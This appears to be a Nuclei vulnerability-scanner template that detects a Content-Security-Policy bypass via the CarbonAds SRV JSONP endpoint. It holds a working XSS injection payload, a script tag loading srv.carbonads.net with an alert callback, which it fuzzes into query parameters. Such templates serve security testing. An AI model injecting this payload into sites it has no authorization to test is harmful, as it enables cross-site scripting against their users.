flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - carbonads_srv_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://srv.carbonads.net/ads/x.json?callback=alert"></script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: carbonads_srv_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - carbonads.com
  method: GET
  path:
  - '{{BaseURL}}'
id: carbonads-srv-csp-bypass
info:
  author: renniepak,DhiyaneshDK
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - CarbonAds SRV
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,carbonads-srv,vuln
